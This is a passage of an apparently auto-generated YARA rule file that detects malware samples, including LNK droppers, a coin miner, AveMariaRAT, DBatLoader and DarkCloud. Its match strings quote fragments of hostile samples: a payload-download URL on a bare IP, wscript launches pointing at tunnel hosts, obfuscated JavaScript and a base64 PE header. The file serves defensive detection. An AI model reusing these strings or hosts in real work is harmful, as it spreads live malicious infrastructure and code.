      $s5 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 20KB and
      all of them
}

rule b773e42aa25516eca1092502b9de4e2a79f6798f065b04606aead2e261b82164_b773e42a {
   meta:
      description = "_subset_batch - file b773e42aa25516eca1092502b9de4e2a79f6798f065b04606aead2e261b82164_b773e42a.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b773e42aa25516eca1092502b9de4e2a79f6798f065b04606aead2e261b82164"
   strings:
      $x1 = "C:\\Windows\\System32\\wscript.exe" fullword ascii /* score: '32.00'*/
      $x2 = "C:\\Users\\Administrator\\Pictures\\sen.bat" fullword wide /* score: '31.00'*/
      $s3 = "(..\\..\\..\\..\\Windows\\System32\\wscript.exeC:\\Users\\Administrator\\PicturesG//B \"\\\\meat-media-sl-type.trycloudflare.co" wide /* score: '28.00'*/
      $s4 = "Pictures (C:\\Users\\Administrator)" fullword wide /* score: '21.00'*/
      $s5 = "sen.bat" fullword wide /* score: '15.00'*/
      $s6 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 6KB and
      1 of ($x*) and all of them
}

rule ddbcb9a1d0a0cd6e4f2d13fe94e6ec86e06f26ba13a408d6266165577ec00f5e_ddbcb9a1 {
   meta:
      description = "_subset_batch - file ddbcb9a1d0a0cd6e4f2d13fe94e6ec86e06f26ba13a408d6266165577ec00f5e_ddbcb9a1.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ddbcb9a1d0a0cd6e4f2d13fe94e6ec86e06f26ba13a408d6266165577ec00f5e"
   strings:
      $x1 = "(..\\..\\..\\..\\Windows\\System32\\wscript.exeC:\\Users\\Administrator\\PicturesT//B \"\\\\wrote-kernel-extend-designation.try" wide /* score: '33.00'*/
      $x2 = "C:\\Windows\\System32\\wscript.exe" fullword ascii /* score: '32.00'*/
      $x3 = "C:\\Users\\Administrator\\Pictures\\sen.bat" fullword wide /* score: '31.00'*/
      $s4 = "Pictures (C:\\Users\\Administrator)" fullword wide /* score: '21.00'*/
      $s5 = "sen.bat" fullword wide /* score: '15.00'*/
      $s6 = "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 6KB and
      1 of ($x*) and all of them
}

rule CoinMiner_signature__23aa6ede111f6ac860a5e9008f9b9673_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_23aa6ede111f6ac860a5e9008f9b9673(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b670f9479fcaf25a792cbb2b025dc333ec86517975e714d5fd476f4cb2bb1281"
   strings:
      $s1 = "http://91.108.241.80:5554/190a97104c764b76898297d44738b7b9_bound_build.exe" fullword ascii /* score: '27.00'*/
      $s2 = "tjgajdjrg.exe" fullword ascii /* score: '22.00'*/
      $s3 = "GetTempPath2W" fullword ascii /* score: '16.00'*/
      $s4 = ".?AVfilesystem_error@filesystem@std@@" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule DarkCloud_signature__fdfe7fa6fe4460148cc13232a4b36c71_imphash_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_fdfe7fa6fe4460148cc13232a4b36c71(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0d9b2c3014ecd8c4efcb87764ff24c84f41e4dcfed3853e9e2bb1d20f94f3bee"
   strings:
      $s1 = "GetTempPath2W" fullword ascii /* score: '16.00'*/
      $s2 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s3 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s4 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s5 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s6 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
      $s7 = "vyfffff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule Diamotri_Clipper_signature__fdfe7fa6fe4460148cc13232a4b36c71_imphash_ {
   meta:
      description = "_subset_batch - file Diamotri-Clipper(signature)_fdfe7fa6fe4460148cc13232a4b36c71(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a29a3f9fad8317d81d77b1e7d3813fd631c36289124165b3fa4006a309d0b417"
   strings:
      $s1 = "GetTempPath2W" fullword ascii /* score: '16.00'*/
      $s2 = "(SHGetKnownFolderPath/SHBrowseForFolder/IShellLink)," fullword wide /* score: '14.00'*/
      $s3 = "(registry), and comctl32 (TaskDialog/InitCommonControls)." fullword wide /* score: '12.00'*/
      $s4 = "%s\\Contact_Explain.txt" fullword wide /* score: '11.00'*/
      $s5 = "%s\\Contact_Explain Shortcut.lnk" fullword wide /* score: '11.00'*/
      $s6 = "It exercises kernel32 (CreateFile/WriteFile)," fullword wide /* score: '9.00'*/
      $s7 = "vyfffff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule d31c138b76d30e4b180308575f5eb6ff_imphash_ {
   meta:
      description = "_subset_batch - file d31c138b76d30e4b180308575f5eb6ff(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4dfbcca0441d00cab3298c404fbad7949979b697aa8cf685835d87a808d91d5f"
   strings:
      $s1 = "independent diverse identifying emotions consist joining practice linear millennium worst contents motors download timing blogge" ascii /* score: '30.00'*/
      $s2 = "scanning istanbul sbjct targets random trucks fourth stone usps its characters fold controller devel blowjobs supplement waiting" ascii /* score: '28.00'*/
      $s3 = "helderpassport.exe.exe" fullword wide /* score: '28.00'*/
      $s4 = "describes encyclopedia arrivals bull apparent antiques seats hamburg devil fastest targeted iceland myspace dive operation" fullword ascii /* score: '26.00'*/
      $s5 = "darkness accessing dominican tenant catalog jpeg publicity maldives complete richard shell payments relatively" fullword ascii /* score: '26.00'*/
      $s6 = "chuck wildlife processed fortune coating see essays comes intranet content relate mb barn selections misc athletic lesson rg vet" ascii /* score: '25.00'*/
      $s7 = "independent diverse identifying emotions consist joining practice linear millennium worst contents motors download timing blogge" ascii /* score: '25.00'*/
      $s8 = "chuck wildlife processed fortune coating see essays comes intranet content relate mb barn selections misc athletic lesson rg vet" ascii /* score: '25.00'*/
      $s9 = "pressure sitting za understand jelsoft equity operating accessing rush abuse dependent customer troops encouraged geometry repor" ascii /* score: '24.00'*/
      $s10 = "anna lease considers terminology assembly bunny avi merry motors substantially dump johnny regional westminster insights brillia" ascii /* score: '24.00'*/
      $s11 = "receptors postcard challenge warnings extended blink rolls scanning field mounts entrepreneurs guam somewhat performs administer" ascii /* score: '23.00'*/
      $s12 = "receivers whale pulling especially target located israel milan push chemicals es satisfaction donate iii accidents bonus grounds" ascii /* score: '23.00'*/
      $s13 = "reno school infected hawaii arthur russian ut edition national municipality budapest surprise observer fur homeland processes so" ascii /* score: '22.00'*/
      $s14 = "all brilliant terrorist affiliated partly training fusion presence introducing invasion pissing vaccine centers ka jelsoft addre" ascii /* score: '22.00'*/
      $s15 = "ng restaurants subscriptions headers exist fiction stuart inches plaza empire area blood" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule b3ebd37aef9133bf982dbda6c7804a85_imphash_ {
   meta:
      description = "_subset_batch - file b3ebd37aef9133bf982dbda6c7804a85(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4715e5522fc91a423a5fcad397b571c5654dc0c4202459fdca06841eba1ae9b3"
   strings:
      $s1 = "perfh011.dat" fullword wide /* score: '14.00'*/
      $s2 = "GetModuleHandleAp" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule Blackmoon_signature__99eb8dcfbd1a7e02dc8bf9d49c4aa67c_imphash_ {
   meta:
      description = "_subset_batch - file Blackmoon(signature)_99eb8dcfbd1a7e02dc8bf9d49c4aa67c(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fde687287ef8cd7e6a6ce655355eaca2fba25fd6c22cc1e4040281f73205ba90"
   strings:
      $s1 = "22.dll" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule AveMariaRAT_signature__2 {
   meta:
      description = "_subset_batch - file AveMariaRAT(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "88074c5e26e6e71230acf339c6807ca5d040884d5cc3d6fe3c6402c16dc21562"
   strings:
      $x1 = "(function(_0x3acfb6,_0x14ae62){var _0x3dd399=_0x1ad1,_0x467c62=_0x3acfb6();while(!![]){try{var _0x28f872=-parseInt(_0x3dd399(0xc" ascii /* score: '49.00'*/
      $s2 = "julleseNjullt','script','5710xrPJZR','4176280zcWIAd','74264EfPfor','Write','protocol','4915113djcFWe','currentTarget','2704ahwWt" ascii /* score: '20.00'*/
      $s3 = "_blog=_0x5c8d9d,_post=_0x5e11a1;if(typeof document[_0x26ffe5(0x10d)]['host']!=_0x1d3559(0x125))var _0x46bfba=document[_0x26ffe5(" ascii /* score: '19.00'*/
      $s4 = "x1ad1,_0x372fd4=_0x51a3;_blog=_0x42194d,_post=_0x326b43;if(typeof document[_0x372fd4(0x10d)]['host']!=_0x372fd4(0xbe))var _0x371" ascii /* score: '19.00'*/
      $s5 = "x338254=_0x1ad1;_blog=_0x11905b,_post=_0x2646be;if(typeof document[_0x338254(0xdb)]['host']!='Rervtajjjblejj1IsNjull')var _0x34c" ascii /* score: '19.00'*/
      $s6 = "#*#** !$~#&*^^?^?*&% %*~&$&%S*$?#$!~^! ~&~#**?&?$!&&*$?!%~?!~~!!*?! ?#%?#&#~!%!!!!% ^*~?~% !?^&~ & !!&*% %*~?#*$~^!?*?#~? &%**#?" ascii /* score: '17.00'*/
      $s7 = "* !?%%d?!~#*&$^!~&~#*%*%^$$%$&^#~**^!^?%~!~%*$% $*%!*!&!~~%^ #!##*%!##$&* & %!%$~^ *?#**?^? &&  ##*%# ~$^$~^&?*%%%%? ? ? *?*%%*^" ascii /* score: '15.00'*/
      $s8 = " _0x156465=_0x1ad1;_blog=_0x4c0bb1,_post=_0x1f23a7;if(typeof document['location']['host']!=_0x156465(0x125))var _0x9e40c=documen" ascii /* score: '15.00'*/
      $s9 = "+scriptName;function getIsRervable1IsNull(){var _0x2adcc3=_0x322d63,_0x46e424=new Array();_0x46e424=document[_0x2adcc3(0x1dd)](_" ascii /* score: '15.00'*/
      $s10 = "vtajjjblejj1IsNjull(){return;}var kittul=WScript[_0x55ead4(0x214)](QQQQQWE);function getIsRervable1IsNull(){var _0x218fa5=_0x55e" ascii /* score: '15.00'*/
      $s11 = "x322d63;_blog=_0x3c855b,_post=_0x5e70ab;if(typeof document[_0x4197ab(0x1c1)][_0x4197ab(0x1da)]!=_0x4197ab(0x1ba))var _0x138b1a=d" ascii /* score: '14.00'*/
      $s12 = "0x11c),_0x1cdb94=typeof _blog!=_0x1b334d(0x131)?_blog:0x0,_0x21a9a7=typeof _post!=_0x1b334d(0x131)?_post:0x0,_0x5be8f6=new Image" ascii /* score: '14.00'*/
      $s13 = "4)][_0x357c64(0x157)]||_0x357c64(0x155),_0x1dabaa=typeof _blog!=_0x357c64(0x15d)?_blog:0x0,_0x2a72b3=typeof _post!=_0x357c64(0x1" ascii /* score: '14.00'*/
      $s14 = "5f2,_0x22304c){var _0x49b268=_0x28f9;_blog=_0x3095f2,_post=_0x22304c;if(typeof document[_0x49b268(0x1c1)][_0x49b268(0x1da)]!=_0x" ascii /* score: '14.00'*/
      $s15 = "(0x1cb),_0x5a222b=typeof _blog!=_0x581e36(0x1ba)?_blog:0x0,_0x2f9644=typeof _post!=_0x581e36(0x1ba)?_post:0x0,_0x53f2f0=new Imag" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule DiskWriter_signature__4167b18b2536ab9aca0145dc5d4c0a28_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_4167b18b2536ab9aca0145dc5d4c0a28(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6fae07ff769adc757672c8849d9e39594fba02215821b47d43c2bf2dd8cafadd"
   strings:
      $s1 = "@user32.dll" fullword wide /* score: '23.00'*/
      $s2 = "Quinestradiol.exe" fullword wide /* score: '22.00'*/
      $s3 = "Quinestradiol.exe -- WARNING" fullword wide /* score: '22.00'*/
      $s4 = "Quinestradiol.exe -- FINAL EPILEPSY WARNING" fullword wide /* score: '22.00'*/
      $s5 = "K:\\Quinestradiol\\Release\\Quinestradiol.pdb" fullword ascii /* score: '19.00'*/
      $s6 = "Copyright 2025 LambdaTechnology.All Right Reserved." fullword wide /* score: '12.00'*/
      $s7 = ">}}}}}}" fullword ascii /* reversed goodware string '}}}}}}>' */ /* score: '11.00'*/
      $s8 = "LambdaTechnology" fullword wide /* score: '9.00'*/
      $s9 = "A harmless GDI malware made by LambdaTechnology" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule DBatLoader_signature_ {
   meta:
      description = "_subset_batch - file DBatLoader(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "57e66cf70ffebed82299fef25d542fe7d7d7fb26c4fe1981fe206b51d2841650"
   strings:
      $x1 = "E.text=\"TVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2d" ascii /* score: '67.00'*/
      $x2 = "AAAAAAAAAAAA6" ascii /* base64 encoded string '         ' */ /* reversed goodware string '6AAAAAAAAAAAA' */ /* score: '35.00'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                   ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                        ' */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                        ' */ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAA0" ascii /* base64 encoded string '         ' */ /* score: '25.00'*/
      $s10 = "AAAAAAAAAAAA5" ascii /* base64 encoded string '         ' */ /* score: '25.00'*/
      $s11 = "AABTZXRXaW5kb3dPcmdFeAAAAABTZXRWaWV3cG9ydE9yZ0V4AAAAAFNldFRleHRDb2xvcgAAAABTZXRTdHJldGNoQmx0TW9kZQAAAFNldFJPUDIAAABTZXRQaXhlbAAA" ascii /* base64 encoded string '  SetWindowOrgEx    SetViewportOrgEx    SetTextColor    SetStretchBltMode   SetROP2   SetPixel  ' */ /* score: '24.00'*/
      $s12 = "AAAAAE1hc2tCbHQAAABMaW5lVG8AAAAASW50ZXJzZWN0Q2xpcFJlY3QAAABHZXRXaW5kb3dPcmdFeAAAAABHZXRUZXh0TWV0cmljc0EAAABHZXRUZXh0RXh0ZW50UG9p" ascii /* base64 encoded string '    MaskBlt   LineTo    IntersectClipRect   GetWindowOrgEx    GetTextMetricsA   GetTextExtentPoi' */ /* score: '24.00'*/
      $s13 = "AAAAAEdldENsaXBCb3gAAAAAR2V0QnJ1c2hPcmdFeAAAAEdldEJpdG1hcEJpdHMAAABHZGlGbHVzaAAAAABFeGNsdWRlQ2xpcFJlY3QAAABEZWxldGVPYmplY3QAAAAA" ascii /* base64 encoded string '    GetClipBox    GetBrushOrgEx   GetBitmapBits   GdiFlush    ExcludeClipRect   DeleteObject    ' */ /* score: '24.00'*/
      $s14 = "YXZlQ3JpdGljYWxTZWN0aW9uAAAAAEluaXRpYWxpemVDcml0aWNhbFNlY3Rpb24AAABHbG9iYWxGaW5kQXRvbUEAAABHbG9iYWxEZWxldGVBdG9tAAAAAEdsb2JhbEFk" ascii /* base64 encoded string 'aveCriticalSection    InitializeCriticalSection   GlobalFindAtomA   GlobalDeleteAtom    GlobalAd' */ /* score: '21.00'*/
      $s15 = "a2VkSW5jcmVtZW50AAAAAFZpcnR1YWxRdWVyeQAAAABXaWRlQ2hhclRvTXVsdGlCeXRlAAAATXVsdGlCeXRlVG9XaWRlQ2hhcgAAAGxzdHJsZW5BAAAAAGxzdHJjcHlu" ascii /* base64 encoded string 'kedIncrement    VirtualQuery    WideCharToMultiByte   MultiByteToWideChar   lstrlenA    lstrcpyn' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule cc4164d57cfdc9987361588442c663e27a73b51abac4706ac173be3491510136_cc4164d5 {
   meta:
      description = "_subset_batch - file cc4164d57cfdc9987361588442c663e27a73b51abac4706ac173be3491510136_cc4164d5.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc4164d57cfdc9987361588442c663e27a73b51abac4706ac173be3491510136"
   strings:
      $s1 = "micorsercisecxbit21r2.exe" fullword ascii /* score: '22.00'*/
      $s2 = "libwinpthread-1.dllPK" fullword ascii /* score: '16.00'*/
      $s3 = "libssp-0.dllPK" fullword ascii /* score: '13.00'*/
      $s4 = "micorsercisecxbit21r2.exePK" fullword ascii /* score: '11.00'*/
      $s5 = "* j;aw" fullword ascii /* score: '9.00'*/
      $s6 = "exkMloG" fullword ascii /* score: '9.00'*/
      $s7 = "lR* -N" fullword ascii /* score: '9.00'*/
      $s8 = "* >jzn" fullword ascii /* score: '9.00'*/
      $s9 = "L+ -(@" fullword ascii /* score: '9.00'*/
      $s10 = "fvvvvvw" fullword ascii /* score: '8.00'*/
      $s11 = "!N>%D%2" fullword ascii /* score: '8.00'*/
      $s12 = "xxzEK* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      8 of them
}

rule b1e71c5b6c170f3aa224eb9fae44a99f3d809e88005c3743b72b231798a3043c_b1e71c5b {
   meta:
      description = "_subset_batch - file b1e71c5b6c170f3aa224eb9fae44a99f3d809e88005c3743b72b231798a3043c_b1e71c5b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b1e71c5b6c170f3aa224eb9fae44a99f3d809e88005c3743b72b231798a3043c"
   strings:
      $s1 = "a!!!DHHQ,$X" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule c671c7f3b0ad252d99ed50cbc4dfebcba3f92b75a919e7e03c9ef279cf9c69bb_c671c7f3 {
   meta:
      description = "_subset_batch - file c671c7f3b0ad252d99ed50cbc4dfebcba3f92b75a919e7e03c9ef279cf9c69bb_c671c7f3.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c671c7f3b0ad252d99ed50cbc4dfebcba3f92b75a919e7e03c9ef279cf9c69bb"
   strings:
      $s1 = "ywwwwwwwwww" fullword ascii /* reversed goodware string 'wwwwwwwwwwy' */ /* score: '18.00'*/
      $s2 = "UVVUUW5Y^" fullword ascii /* base64 encoded string 'QUTQnX' */ /* score: '14.00'*/
      $s3 = "VUVVVW" fullword ascii /* reversed goodware string 'WVVVUV' */ /* score: '13.50'*/
      $s4 = "YUUUUT" fullword ascii /* reversed goodware string 'TUUUUY' */ /* score: '13.50'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule c711a874ca760ec5854225e349cbccef5852ba4152f78d29387c39c68e1d0aa7_c711a874 {
   meta:
      description = "_subset_batch - file c711a874ca760ec5854225e349cbccef5852ba4152f78d29387c39c68e1d0aa7_c711a874.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c711a874ca760ec5854225e349cbccef5852ba4152f78d29387c39c68e1d0aa7"
   strings:
      $s1 = "SyUgR- " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 4000KB and
      all of them
}

rule c1201007f24fe8ef3e37fc185993eed2_imphash_ {
   meta:
      description = "_subset_batch - file c1201007f24fe8ef3e37fc185993eed2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7f651ca92b6d1f71dd2cb8e3af99998ccdc20fec2c9569dec3f2764803742dc0"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\"/>" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 90KB and
      all of them
}

rule c1c41108ad8303cd675a1010dd21ed58f9697b04227b9296fd223c67766d61c6_c1c41108 {
   meta:
      description = "_subset_batch - file c1c41108ad8303cd675a1010dd21ed58f9697b04227b9296fd223c67766d61c6_c1c41108.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c1c41108ad8303cd675a1010dd21ed58f9697b04227b9296fd223c67766d61c6"
   strings:
      $s1 = "zzrrzrz" fullword ascii /* score: '8.00'*/
      $s2 = "scinnni" fullword ascii /* score: '8.00'*/
      $s3 = "//.hta" fullword ascii /* score: '8.00'*/
      $s4 = "PSAM<^/" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule d2e06f0479a62473c4f48c0d442b1a1d60052ca1e05c1b9067e4572a16148a3e_d2e06f04 {
   meta:
      description = "_subset_batch - file d2e06f0479a62473c4f48c0d442b1a1d60052ca1e05c1b9067e4572a16148a3e_d2e06f04.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d2e06f0479a62473c4f48c0d442b1a1d60052ca1e05c1b9067e4572a16148a3e"
   strings:
      $s1 = "22222%" fullword ascii /* reversed goodware string '%22222' */ /* score: '11.00'*/
      $s2 = "xSPYo^}" fullword ascii /* score: '9.00'*/
      $s3 = "irckO-Y" fullword ascii /* score: '9.00'*/
      $s4 = "gggoggf" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule b30d4021abe7bc754f90105bfd91830d_imphash_ {
   meta:
      description = "_subset_batch - file b30d4021abe7bc754f90105bfd91830d(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "716637a424bce58ff8c75e40b6e29c33318ff185af6e9e62d85b61e56a560eac"
   strings:
      $s1 = "rpCEMsJ.dll" fullword ascii /* score: '23.00'*/
      $s2 = "sqclkbrcrdlbnoecnxuleloaejjhtipwumaxhdvhsdhrcknpmqhohfcrcpmhvuyngbcmvgovouxntvbebpufcgjbksoeiogypwogbagvhmapbubyrdhrggmuvnpvekap" ascii /* score: '14.00'*/
      $s3 = "gibvlclhqurvsqrakrdibijujqcdbmnqojrnvvfnxoamrdfvqnlgkynwrxtevpsgehldlysrfqcnypmofbsuecdhyguiwhjlrfayrsenacmpxscpgkrnjjfrmwxircoe" ascii /* score: '13.00'*/
      $s4 = "apiLoader" fullword ascii /* score: '13.00'*/
      $s5 = "vycjjucffhvyxmqggxxywlqkitbcwrmdnmhmvqbxjhtsgduuwgpxyahayfgvfkqkdhyyamslmtwvsqgpawagcopqgvvunipcqienovwplogfrlnfpvrdxraljybujmeh" ascii /* score: '13.00'*/
      $s6 = "dqdsyyrxwjjgkgioahokjhdfdpcplarvcxiafiqvebafanegbgjlgkjghokvqayuixgionwcycnkcrxnrcyrxhnwdbqkkdmdofwmjfbuoittnkntmmunlaqfltulvhju" ascii /* score: '12.00'*/
      $s7 = "kdpxgoeqdkhotrbinntahqmffmxteevskmebnqhqmnnjqmqfjqubkemlmpbcroifujfuiiqqkonsbfqhfotlcrtudtbnthegjstrwhuujaeppkrboxvlqllbartoydft" ascii /* score: '11.00'*/
      $s8 = "xajqjoqmgqbdfyhvbbfsuiprixbcpkmevykhcorrtrqxnbodcnsfkqmkpdwnlqamjwybagjopenfgfokhkeyvhiubffyvinjlritevtjtyagnavgfhuajeimsxjssdia" ascii /* score: '11.00'*/
      $s9 = "yujgvehmmgfwodpiajnopjdbrbkhqyuvixvnqcryqvfwwmgcfjhgcpvovcmdsilksqjljubiwnyktdndiyecriiougjvyxfhbcbjlqehovixfhnlckuapiqrlvherjee" ascii /* score: '11.00'*/
      $s10 = "wnsxrijoquafphthpjlmabmmseyutnaqepsmheqcfupslfehmbabyoktlcedcgnojtqispgchmxoqoptqwtbeeacconhayqikrwxsowubyyvygnmalpctovqmkchkbin" ascii /* score: '11.00'*/
      $s11 = "kdpxgoeqdkhotrbinntahqmffmxteevskmebnqhqmnnjqmqfjqubkemlmpbcroifujfuiiqqkonsbfqhfotlcrtudtbnthegjstrwhuujaeppkrboxvlqllbartoydft" ascii /* score: '11.00'*/
      $s12 = "tnmcxtxcwujexltigkibsrvfccvqajudblovtnbueyfycfnoaskgnpmcqcwceseefcldxapwxnxyyqqfqfqcxwwwaqncmwqljvihxqdttofllolteyacfbcomgtxomwu" ascii /* score: '11.00'*/
      $s13 = "\\cnmplog" fullword wide /* score: '10.00'*/
      $s14 = "rwqugdafbwonxkxppuxrjnmapfdgpowqirhyttqvpiemefacfgydiufysiqjrcyntxnrilshrpdahxwraaktxnhdvuiprghtgoplgnanbvygyksysgminxxpbqlccnit" ascii /* score: '9.00'*/
      $s15 = "fdnhggdypniykgaxgpknwthyjljapdiqliwubwdwrkvgcioivgntnjwurvvivrjaxxvcadwsyrxmiqnerlkkcbnwofnotnpvmrjlsbnlfqobiccemspybsmafnpjogcv" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule b3d7318ed86f17fcb6b10602f70755aceae345b2b6551b0ebc483c58e6f934e3_b3d7318e {
   meta:
      description = "_subset_batch - file b3d7318ed86f17fcb6b10602f70755aceae345b2b6551b0ebc483c58e6f934e3_b3d7318e.gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b3d7318ed86f17fcb6b10602f70755aceae345b2b6551b0ebc483c58e6f934e3"
   strings:
      $s1 = "Pilne zamowienie VAG-TECH  REF_ MT350E XL.cmd" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x8b1f and filesize < 10KB and
      all of them
}

rule b423ebb46849218eacef39fc931cd046084ec1c3a04cad0730ba34759cae3daa_b423ebb4 {
   meta:
      description = "_subset_batch - file b423ebb46849218eacef39fc931cd046084ec1c3a04cad0730ba34759cae3daa_b423ebb4.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b423ebb46849218eacef39fc931cd046084ec1c3a04cad0730ba34759cae3daa"
   strings:
      $s1 = "708e198608b5b463224c3fb77fcf708b845d0c7b5dbc6e9cab9e185c489be089.exe" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule b434570c408e18916ded93f7183b49e23223035a98eeefda941cbb2259387674_b434570c {
   meta:
      description = "_subset_batch - file b434570c408e18916ded93f7183b49e23223035a98eeefda941cbb2259387674_b434570c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b434570c408e18916ded93f7183b49e23223035a98eeefda941cbb2259387674"
   strings:
      $s1 = "77777777777777777777777777777777777777777777777777" ascii /* score: '17.00'*/ /* hex encoded string 'wwwwwwwwwwwwwwwwwwwwwwwww' */
   condition:
      uint16(0) == 0xd8ff and filesize < 200KB and
      all of them
}

rule b4de258f62843f57dc7f9a22656bb1243bbe4218cf2f2473680ee1d1fa828b89_b4de258f {
   meta:
      description = "_subset_batch - file b4de258f62843f57dc7f9a22656bb1243bbe4218cf2f2473680ee1d1fa828b89_b4de258f.docx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b4de258f62843f57dc7f9a22656bb1243bbe4218cf2f2473680ee1d1fa828b89"
   strings:
      $s1 = "Egetcd>/" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

